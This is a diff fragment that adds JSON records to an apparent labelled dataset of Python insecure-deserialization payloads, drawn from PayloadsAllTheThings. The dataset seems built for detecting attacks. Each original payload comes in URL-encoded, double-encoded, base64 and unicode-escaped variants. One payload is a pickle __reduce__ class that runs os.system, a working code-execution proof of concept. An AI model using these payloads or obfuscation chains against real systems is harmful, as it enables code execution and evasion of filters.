+    "payload": "import%20cPickle%0Afrom%20base64 import%20b64encode,%20b64decode%0A%0Aclass%20User%5Cu003a%0A%20%20%20%20def%20__init__\\u0028self%29%5Cu003a\n %20%20%20%20%20%20%20self.username%20%3D%20%5Cu0022anonymous%22\n %20%20 %20%20%20%20self.password %5Cu003d %22anonymous%5Cu0022\n %20%20%20%20%20%20%20self.rank%20%20 %20%20=%20%22guest\"%0A%0Ah %5Cu003d User%5Cu0028%29%0Aauth_token%20\\u003d%20b64encode%28cPickle.dumps%5Cu0028h%29%29%0Aprint%5Cu0028%22Your%20Auth%20Token%20%5Cu003a%20%5Cu007b\\u007d%5Cu0022%29.format%5Cu0028auth_token\\u0029",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00020",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "2d2be12229ab3a30547103ce24823221910c74ead3f65a085b0e0e572b31fc52",
+    "original_id": "raw_deser_00020",
+    "original_payload": "import cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n        self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)",
+    "obfuscated_payload": "import%20cPickle%0Afrom%20base64 import%20b64encode,%20b64decode%0A%0Aclass%20User%5Cu003a%0A%20%20%20%20def%20__init__\\u0028self%29%5Cu003a\n %20%20%20%20%20%20%20self.username%20%3D%20%5Cu0022anonymous%22\n %20%20 %20%20%20%20self.password %5Cu003d %22anonymous%5Cu0022\n %20%20%20%20%20%20%20self.rank%20%20 %20%20=%20%22guest\"%0A%0Ah %5Cu003d User%5Cu0028%29%0Aauth_token%20\\u003d%20b64encode%28cPickle.dumps%5Cu0028h%29%29%0Aprint%5Cu0028%22Your%20Auth%20Token%20%5Cu003a%20%5Cu007b\\u007d%5Cu0022%29.format%5Cu0028auth_token\\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "url_decode"
+    ],
+    "generation_seed": 49665629,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00021__obf01",
+    "payload": "import%20cPickle",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0673573434d3722f7833c5f157ffd4c32bdd0e170853e2caf5500a1340d12f2",
+    "original_id": "raw_deser_00021",
+    "original_payload": "import cPickle",
+    "obfuscated_payload": "import%20cPickle",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49762605,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00021__obf02",
+    "payload": "aW1wb3J0IGNQaWNrbGU=",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0673573434d3722f7833c5f157ffd4c32bdd0e170853e2caf5500a1340d12f2",
+    "original_id": "raw_deser_00021",
+    "original_payload": "import cPickle",
+    "obfuscated_payload": "aW1wb3J0IGNQaWNrbGU=",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 49763614,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00021__obf03",
+    "payload": "import+cPickle",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0673573434d3722f7833c5f157ffd4c32bdd0e170853e2caf5500a1340d12f2",
+    "original_id": "raw_deser_00021",
+    "original_payload": "import cPickle",
+    "obfuscated_payload": "import+cPickle",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 49764623,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00021__obf04",
+    "payload": "aW1wb3J0XHUwMDIwY1BpY2tsZQ==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00021",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0673573434d3722f7833c5f157ffd4c32bdd0e170853e2caf5500a1340d12f2",
+    "original_id": "raw_deser_00021",
+    "original_payload": "import cPickle",
+    "obfuscated_payload": "aW1wb3J0XHUwMDIwY1BpY2tsZQ==",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "base64url_decode"
+    ],
+    "generation_seed": 49765632,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00022__obf01",
+    "payload": "auth_tok%65n = b64encode(cP%69c%6Ble.%64umps(h))",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8c3d90111e7895155d831d654e70bca3c68eec80d98c5037238ceb9ea46cdceb",
+    "original_id": "raw_deser_00022",
+    "original_payload": "auth_token = b64encode(cPickle.dumps(h))",
+    "obfuscated_payload": "auth_tok%65n = b64encode(cP%69c%6Ble.%64umps(h))",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49862608,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00022__obf02",
+    "payload": "YXV0aF90b2tlbiA9IGI2NGVuY29kZShjUGlja2xlLmR1bXBzKGgpKQ==",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8c3d90111e7895155d831d654e70bca3c68eec80d98c5037238ceb9ea46cdceb",
+    "original_id": "raw_deser_00022",
+    "original_payload": "auth_token = b64encode(cPickle.dumps(h))",
+    "obfuscated_payload": "YXV0aF90b2tlbiA9IGI2NGVuY29kZShjUGlja2xlLmR1bXBzKGgpKQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 49863617,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00022__obf03",
+    "payload": "auth_token+=%09b64encode(cPickle.dumps(h))",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8c3d90111e7895155d831d654e70bca3c68eec80d98c5037238ceb9ea46cdceb",
+    "original_id": "raw_deser_00022",
+    "original_payload": "auth_token = b64encode(cPickle.dumps(h))",
+    "obfuscated_payload": "auth_token+=%09b64encode(cPickle.dumps(h))",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 49864626,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00022__obf04",
+    "payload": "auth_token%252B%253D%25250Ab64encode%2528cPickle.dumps%2528h%2529%2529",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00022",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8c3d90111e7895155d831d654e70bca3c68eec80d98c5037238ceb9ea46cdceb",
+    "original_id": "raw_deser_00022",
+    "original_payload": "auth_token = b64encode(cPickle.dumps(h))",
+    "obfuscated_payload": "auth_token%252B%253D%25250Ab64encode%2528cPickle.dumps%2528h%2529%2529",
+    "obfuscation_chain": [
+      "whitespace_variant",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 49865635,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00023__obf01",
+    "payload": "new_token%20%3D raw_input%28%22New%20Auth%20Token%20%3A%20%22%29%0Atoken %3D%20cPickle.loads(b64decode%28new_token%29)%0Aprint%20%22Welcome%20%7B%7D%22.format%28token.username)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "54909b51652cd79ccf36e23f19bf50f7ad42758a200c57a9fb024f05ff2cd984",
+    "original_id": "raw_deser_00023",
+    "original_payload": "new_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)",
+    "obfuscated_payload": "new_token%20%3D raw_input%28%22New%20Auth%20Token%20%3A%20%22%29%0Atoken %3D%20cPickle.loads(b64decode%28new_token%29)%0Aprint%20%22Welcome%20%7B%7D%22.format%28token.username)",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49962611,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00023__obf02",
+    "payload": "bmV3X3Rva2VuID0gcmF3X2lucHV0KCJOZXcgQXV0aCBUb2tlbiA6ICIpCnRva2VuID0gY1BpY2tsZS5sb2FkcyhiNjRkZWNvZGUobmV3X3Rva2VuKSkKcHJpbnQgIldlbGNvbWUge30iLmZvcm1hdCh0b2tlbi51c2VybmFtZSk",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "54909b51652cd79ccf36e23f19bf50f7ad42758a200c57a9fb024f05ff2cd984",
+    "original_id": "raw_deser_00023",
+    "original_payload": "new_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)",
+    "obfuscated_payload": "bmV3X3Rva2VuID0gcmF3X2lucHV0KCJOZXcgQXV0aCBUb2tlbiA6ICIpCnRva2VuID0gY1BpY2tsZS5sb2FkcyhiNjRkZWNvZGUobmV3X3Rva2VuKSkKcHJpbnQgIldlbGNvbWUge30iLmZvcm1hdCh0b2tlbi51c2VybmFtZSk",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 49963620,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00023__obf03",
+    "payload": "new_token = raw_input\\u0028\"New Auth Token \\u003a \\u0022\\u0029\ntoken = cPickle.loads\\u0028b64decode(new_token\\u0029\\u0029\nprint \\u0022Welcome {}\".format\\u0028token.username\\u0029",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "54909b51652cd79ccf36e23f19bf50f7ad42758a200c57a9fb024f05ff2cd984",
+    "original_id": "raw_deser_00023",
+    "original_payload": "new_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)",
+    "obfuscated_payload": "new_token = raw_input\\u0028\"New Auth Token \\u003a \\u0022\\u0029\ntoken = cPickle.loads\\u0028b64decode(new_token\\u0029\\u0029\nprint \\u0022Welcome {}\".format\\u0028token.username\\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 49964629,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00023__obf04",
+    "payload": "new_to%6Ben = r%61w%5F%69nput(\"N%65%77 Auth Token : \")\ntoken = cPickle.loads(b64d%65code(%6Eew_t%6Fke%6E))\npri%6E%74 \"Welcome {}\".fo%72mat(token.userna%6De)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00023",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "54909b51652cd79ccf36e23f19bf50f7ad42758a200c57a9fb024f05ff2cd984",
+    "original_id": "raw_deser_00023",
+    "original_payload": "new_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)",
+    "obfuscated_payload": "new_to%6Ben = r%61w%5F%69nput(\"N%65%77 Auth Token : \")\ntoken = cPickle.loads(b64d%65code(%6Eew_t%6Fke%6E))\npri%6E%74 \"Welcome {}\".fo%72mat(token.userna%6De)",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 49965638,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00024__obf01",
+    "payload": "token%2520%253D%2520cPickle.loads%2528b64decode%2528new_token%2529%2529",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d70aa853e748cd58d9bf4a58526b6a127cdb6a66a395272dc883d222d982b7c1",
+    "original_id": "raw_deser_00024",
+    "original_payload": "token = cPickle.loads(b64decode(new_token))",
+    "obfuscated_payload": "token%2520%253D%2520cPickle.loads%2528b64decode%2528new_token%2529%2529",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 50062614,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00024__obf02",
+    "payload": "dG9rZW4gPSBjUGlja2xlLmxvYWRzKGI2NGRlY29kZShuZXdfdG9rZW4pKQ",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d70aa853e748cd58d9bf4a58526b6a127cdb6a66a395272dc883d222d982b7c1",
+    "original_id": "raw_deser_00024",
+    "original_payload": "token = cPickle.loads(b64decode(new_token))",
+    "obfuscated_payload": "dG9rZW4gPSBjUGlja2xlLmxvYWRzKGI2NGRlY29kZShuZXdfdG9rZW4pKQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 50063623,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00024__obf03",
+    "payload": "token \\u003d cPickle.loads\\u0028b64decode(new_token\\u0029\\u0029",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d70aa853e748cd58d9bf4a58526b6a127cdb6a66a395272dc883d222d982b7c1",
+    "original_id": "raw_deser_00024",
+    "original_payload": "token = cPickle.loads(b64decode(new_token))",
+    "obfuscated_payload": "token \\u003d cPickle.loads\\u0028b64decode(new_token\\u0029\\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 50064632,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00024__obf04",
+    "payload": "token%2520%255Cu003d%2520cPickle.loads%255Cu0028b64decode%255Cu0028new_token%2529%2529",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "d70aa853e748cd58d9bf4a58526b6a127cdb6a66a395272dc883d222d982b7c1",
+    "original_id": "raw_deser_00024",
+    "original_payload": "token = cPickle.loads(b64decode(new_token))",
+    "obfuscated_payload": "token%2520%255Cu003d%2520cPickle.loads%255Cu0028b64decode%255Cu0028new_token%2529%2529",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "unicode_escape_decode",
+      "url_decode_twice"
+    ],
+    "generation_seed": 50065641,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00025__obf01",
+    "payload": "import%2520cPickle%252C%2520os%250Afrom%2520base64%2520import%2520b64encode%252C%2520b64decode%250A%250Aclass%2520Evil%2528object%2529%253A%250A%2520%2520%2520%2520def%2520__reduce__%2528self%2529%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520return%2520%2528os.system%252C%2528%2522whoami%2522%252C%2529%2529%250A%250Ae%2520%253D%2520Evil%2528%2529%250Aevil_token%2520%253D%2520b64encode%2528cPickle.dumps%2528e%2529%2529%250Aprint%2528%2522Your%2520Evil%2520Token%2520%253A%2520%257B%257D%2522%2529.format%2528evil_token%2529",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5080eb360fc56668cc5663673c3ebd9079cae635a5a33b9f60287d6abd0ff135",
+    "original_id": "raw_deser_00025",
+    "original_payload": "import cPickle, os\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)",
+    "obfuscated_payload": "import%2520cPickle%252C%2520os%250Afrom%2520base64%2520import%2520b64encode%252C%2520b64decode%250A%250Aclass%2520Evil%2528object%2529%253A%250A%2520%2520%2520%2520def%2520__reduce__%2528self%2529%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520return%2520%2528os.system%252C%2528%2522whoami%2522%252C%2529%2529%250A%250Ae%2520%253D%2520Evil%2528%2529%250Aevil_token%2520%253D%2520b64encode%2528cPickle.dumps%2528e%2529%2529%250Aprint%2528%2522Your%2520Evil%2520Token%2520%253A%2520%257B%257D%2522%2529.format%2528evil_token%2529",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 50162617,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_deser_00025__obf02",
+    "payload": "aW1wb3J0IGNQaWNrbGUsIG9zCmZyb20gYmFzZTY0IGltcG9ydCBiNjRlbmNvZGUsIGI2NGRlY29kZQoKY2xhc3MgRXZpbChvYmplY3QpOgogICAgZGVmIF9fcmVkdWNlX18oc2VsZik6CiAgICAgICAgcmV0dXJuIChvcy5zeXN0ZW0sKCJ3aG9hbWkiLCkpCgplID0gRXZpbCgpCmV2aWxfdG9rZW4gPSBiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhlKSkKcHJpbnQoIllvdXIgRXZpbCBUb2tlbiA6IHt9IikuZm9ybWF0KGV2aWxfdG9rZW4p",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5080eb360fc56668cc5663673c3ebd9079cae635a5a33b9f60287d6abd0ff135",
+    "original_id": "raw_deser_00025",
+    "original_payload": "import cPickle, os\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)",
+    "obfuscated_payload": "aW1wb3J0IGNQaWNrbGUsIG9zCmZyb20gYmFzZTY0IGltcG9ydCBiNjRlbmNvZGUsIGI2NGRlY29kZQoKY2xhc3MgRXZpbChvYmplY3QpOgogICAgZGVmIF9fcmVkdWNlX18oc2VsZik6CiAgICAgICAgcmV0dXJuIChvcy5zeXN0ZW0sKCJ3aG9hbWkiLCkpCgplID0gRXZpbCgpCmV2aWxfdG9rZW4gPSBiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhlKSkKcHJpbnQoIllvdXIgRXZpbCBUb2tlbiA6IHt9IikuZm9ybWF0KGV2aWxfdG9rZW4p",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 50163626,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_deser_00025__obf03",
+    "payload": "import%09cPickle,+os\nfrom%0Abase64%09import%09b64encode,%09b64decode\n\nclass%09Evil(object):\n%09def%0A__reduce__(self):\n%0Areturn+(os.system,(\"whoami\",))\n\ne%09=%09Evil()\nevil_token+=%0Ab64encode(cPickle.dumps(e))\nprint(\"Your%0AEvil%09Token%0A:%09{}\").format(evil_token)",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "5080eb360fc56668cc5663673c3ebd9079cae635a5a33b9f60287d6abd0ff135",
+    "original_id": "raw_deser_00025",
+    "original_payload": "import cPickle, os\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)",
+    "obfuscated_payload": "import%09cPickle,+os\nfrom%0Abase64%09import%09b64encode,%09b64decode\n\nclass%09Evil(object):\n%09def%0A__reduce__(self):\n%0Areturn+(os.system,(\"whoami\",))\n\ne%09=%09Evil()\nevil_token+=%0Ab64encode(cPickle.dumps(e))\nprint(\"Your%0AEvil%09Token%0A:%09{}\").format(evil_token)",
+    "obfuscation_chain": [
+      "whitespace_variant"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 50164635,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_deser_00025__obf04",
+    "payload": "aW1wb3J0JTBBY1BpY2tsZSwrb3MKZnJvbSUwOWJhc2U2NCUwOWltcG9ydCUwQWI2NGVuY29kZSwlMDliNjRkZWNvZGUKCmNsYXNzJTBBRXZpbChvYmplY3QpOgolMEFkZWYlMEFfX3JlZHVjZV9fKHNlbGYpOgorcmV0dXJuKyhvcy5zeXN0ZW0sKCJ3aG9hbWkiLCkpCgplJTBBPSUwQUV2aWwoKQpldmlsX3Rva2VuJTBBPStiNjRlbmNvZGUoY1BpY2tsZS5kdW1wcyhlKSkKcHJpbnQoIllvdXIlMEFFdmlsJTBBVG9rZW4lMDk6JTA5e30iKS5mb3JtYXQoZXZpbF90b2tlbik",
+    "label": 1,
+    "attack_type": "deser",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_deser_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Insecure%20Deserialization/Python.md",
+    "source_path": "Insecure Deserialization/Python.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
